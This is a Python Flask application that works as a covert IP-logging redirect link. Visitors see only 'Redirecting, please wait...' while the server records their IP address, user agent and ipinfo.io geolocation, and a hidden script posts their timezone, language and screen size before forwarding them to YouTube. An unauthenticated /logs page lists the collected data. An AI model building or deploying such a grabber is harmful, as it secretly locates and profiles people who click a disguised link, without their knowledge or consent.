from flask import Flask, request, render_template_string
from datetime import datetime
import csv
import os
import requests

app = Flask(__name__)

TARGET_URL = "https://www.youtube.com"
LOG_FILE = "log.csv"

if not os.path.exists(LOG_FILE):
    with open(LOG_FILE, "w", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerow(["Timestamp", "IP", "City", "Region", "Country", "User-Agent", "Timezone", "Language", "Screen Resolution"])

last_visit = {}

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><title>Redirecting...</title></head>
<body>
<p>Redirecting, please wait...</p>
<script>
  function sendData() {
    fetch("/log_additional", {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        language: navigator.language,
        screen: screen.width + "x" + screen.height
      })
    }).finally(() => {
      window.location.href = "{{ target_url }}";
    });
  }
  sendData();
</script>
</body>
</html>
"""

def get_geo(ip):
    try:
        print(f"Fetching geo for IP: {ip}")
        res = requests.get(f"https://ipinfo.io/{ip}/json", timeout=5)
        if res.status_code == 200:
            data = res.json()
            city = data.get("city", "Unknown")
            region = data.get("region", "Unknown")
            country = data.get("country", "Unknown")
            print(f"Geo found: {city}, {region}, {country}")
            return city, region, country
    except Exception as e:
        print(f"Geo lookup failed: {e}")
    return "Unknown", "Unknown", "Unknown"

@app.route("/")
def index():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    ua = request.headers.get("User-Agent", "Unknown")
    timestamp = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")
    print(f"Visit from IP: {ip} UA: {ua} at {timestamp}")

    city, region, country = get_geo(ip)
    last_visit[ip] = {
        "Timestamp": timestamp,
        "IP": ip,
        "City": city,
        "Region": region,
        "Country": country,
        "User-Agent": ua
    }
    return render_template_string(HTML_TEMPLATE, target_url=TARGET_URL)

@app.route("/log_additional", methods=["POST"])
def log_additional():
    data = request.get_json()
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    print(f"Additional log from IP: {ip} Data: {data}")
    base_data = last_visit.get(ip)

    if base_data:
        row = [
            base_data["Timestamp"],
            base_data["IP"],
            base_data["City"],
            base_data["Region"],
            base_data["Country"],
            base_data["User-Agent"],
            data.get("timezone", "Unknown"),
            data.get("language", "Unknown"),
            data.get("screen", "Unknown"),
        ]
        try:
            with open(LOG_FILE, "a", newline="", encoding="utf-8") as f:
                writer = csv.writer(f)
                writer.writerow(row)
            print(f"Logged data for IP {ip}")
        except Exception as e:
            print(f"Failed to write log: {e}")
    else:
        print(f"No base data found for IP {ip} on additional log")
    return ("", 204)

@app.route("/logs")
def logs():
    if not os.path.exists(LOG_FILE):
        return "<p>Nessun dato raccolto ancora.</p>"

    with open(LOG_FILE, "r", encoding="utf-8") as f:
        lines = f.readlines()

    rows = [line.strip().split(",") for line in lines]

    table = "<table border='1' style='border-collapse:collapse;'><tr>{}</tr>{}</table>"
    header_html = "".join(f"<th style='padding:5px;'>{h}</th>" for h in rows[0])
    body_html = "".join(
        "<tr>{}</tr>".format("".join(f"<td style='padding:5px;'>{cell}</td>" for cell in row)) for row in rows[1:]
    )

    return table.format(header_html, body_html)

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=True)
